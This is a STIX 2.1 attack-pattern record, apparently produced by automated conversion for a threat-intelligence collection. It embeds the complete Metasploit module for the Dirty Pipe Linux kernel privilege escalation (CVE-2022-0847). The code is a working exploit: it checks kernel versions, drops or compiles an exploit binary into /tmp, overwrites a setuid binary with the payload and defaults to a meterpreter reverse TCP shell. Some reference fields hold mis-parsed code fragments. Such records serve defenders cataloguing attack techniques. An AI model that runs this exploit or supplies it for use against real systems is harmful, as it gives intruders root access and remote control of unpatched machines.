{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ecdba92c-da0d-4fac-a9a8-0f91bfa54e3e",
    "created": "2024-08-14T16:59:25.66559Z",
    "modified": "2024-08-14T16:59:25.665597Z",
    "name": "Dirty Pipe Local Privilege Escalation via CVE-2022-0847",
    "description": " This exploit targets a vulnerability in the Linux kernel since 5.8, that allows writing of read only or immutable memory.  The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102. The module exploits this vulnerability by overwriting a suid binary with the payload, executing it, and then writing the original data back.  There are two major limitations of this exploit: the offset cannot be on a page boundary (it needs to write one byte before the offset to add a reference to this page to the pipe), and the write cannot cross a page boundary. This means the payload must be less than the page size (4096 bytes).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2022_0847_dirtypipe.rb",
            "external_id": "cve_2022_0847_dirtypipe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-0847"
        },
        {
            "source_name": "reference",
            "url": "https://dirtypipe.cm4all.com"
        },
        {
            "source_name": "reference",
            "url": "https://haxx.in/files/dirtypipez.c"
        },
        {
            "source_name": "exploit_c=exploit_data(CVE-2022-0847",
            "external_id": "CVE-2022-0847.c)"
        },
        {
            "source_name": "exploit_bin=exploit_data(CVE-2022-0847",
            "external_id": "\"CVE-2022-0847-#{arch}\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Compile\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Dirty Pipe Local Privilege Escalation via CVE-2022-0847',\n        'Description' => %q{\n          This exploit targets a vulnerability in the Linux kernel since 5.8, that allows\n          writing of read only or immutable memory.\n\n          The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.\n          The module exploits this vulnerability by overwriting a suid binary with the\n          payload, executing it, and then writing the original data back.\n\n          There are two major limitations of this exploit: the offset cannot be on a page\n          boundary (it needs to write one byte before the offset to add a reference to\n          this page to the pipe), and the write cannot cross a page boundary.\n          This means the payload must be less than the page size (4096 bytes).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Max Kellermann', # Original vulnerability discovery\n          'timwr', # Metasploit Module\n        ],\n        'DisclosureDate' => '2022-02-20',\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Platform' => [ 'linux' ],\n        'Arch' => [\n          ARCH_X64,\n          ARCH_X86,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n        ],\n        'Targets' => [['Automatic', {}]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'AppendExit' => true,\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependSetreuid' => true,\n          'PrependSetuid' => true,\n          'PrependFork' => true,\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n        },\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2022-0847' ],\n          [ 'URL', 'https://dirtypipe.cm4all.com' ],\n          [ 'URL', 'https://haxx.in/files/dirtypipez.c' ],\n        ],\n        'Notes' => {\n          'AKA' => [ 'Dirty Pipe' ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('WRITABLE_DIR', [ true, 'A directory where we can write files', '/tmp' ]),\n      OptString.new('SUID_BINARY_PATH', [ false, 'The path to a suid binary', '/bin/passwd' ])\n    ])\n  end\n\n  def check\n    arch = kernel_arch\n    unless live_compile? || arch.include?('x64') || arch.include?('aarch64') || arch.include?('x86') || arch.include?('armle')\n      return CheckCode::Safe(\"System architecture #{arch} is not supported without live compilation\")\n    end\n\n    kernel_version = Rex::Version.new kernel_release.split('-').first\n    if kernel_version < Rex::Version.new('5.8') ||\n       kernel_version >= Rex::Version.new('5.16.11') ||\n       (kernel_version >= Rex::Version.new('5.15.25') && kernel_version < Rex::Version.new('5.16')) ||\n       (kernel_version >= Rex::Version.new('5.10.102') && kernel_version < Rex::Version.new('5.11'))\n      return CheckCode::Safe(\"Linux kernel version #{kernel_version} is not vulnerable\")\n    end\n\n    CheckCode::Appears(\"Linux kernel version found: #{kernel_version}\")\n  end\n\n  def exp_dir\n    datastore['WRITABLE_DIR']\n  end\n\n  def exploit\n    suid_binary_path = datastore['SUID_BINARY_PATH']\n    fail_with(Failure::BadConfig, 'The suid binary was not found; try setting SUID_BINARY_PATH') if suid_binary_path.nil?\n    fail_with(Failure::BadConfig, \"The #{suid_binary_path} binary setuid bit is not set\") unless setuid?(suid_binary_path)\n\n    arch = kernel_arch\n    vprint_status(\"Detected architecture: #{arch}\")\n    vprint_status(\"Detected payload arch: #{payload.arch.first}\")\n    unless arch == payload.arch.first\n      fail_with(Failure::BadConfig, 'Payload/Host architecture mismatch. Please select the proper target architecture')\n    end\n\n    payload_data = generate_payload_exe[1..] # trim the first byte (0x74)\n    if payload_data.length > 4095\n      fail_with(Failure::BadConfig, \"Payload size #{payload_data.length} is too large (> 4095)\")\n    end\n\n    fail_with(Failure::BadConfig, \"#{exp_dir} is not writable\") unless writable?(exp_dir)\n    exploit_file = \"#{exp_dir}/.#{Rex::Text.rand_text_alpha_lower(6..12)}\"\n\n    if live_compile?\n      vprint_status('Live compiling exploit on system...')\n      exploit_c = exploit_data('CVE-2022-0847', 'CVE-2022-0847.c')\n      exploit_c.sub!(/payload_bytes.*$/, \"payload_bytes[#{payload_data.length}] = {#{Rex::Text.to_num(payload_data)}};\")\n      upload_and_compile(exploit_file, exploit_c)\n    else\n      vprint_status('Dropping pre-compiled exploit on system...')\n      exploit_bin = exploit_data('CVE-2022-0847', \"CVE-2022-0847-#{arch}\")\n      payload_placeholder_index = exploit_bin.index('PAYLOAD_PLACEHOLDER')\n      exploit_bin[payload_placeholder_index, payload_data.length] = payload_data\n      upload_and_chmodx(exploit_file, exploit_bin)\n    end\n\n    register_file_for_cleanup(exploit_file)\n    overwrite_file_path = datastore['SUID_BINARY_PATH']\n\n    cmd = \"#{exploit_file} #{overwrite_file_path}\"\n    print_status(\"Executing exploit '#{cmd}'\")\n    result = cmd_exec(cmd)\n    vprint_status(\"Exploit result:\\n#{result}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-20",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}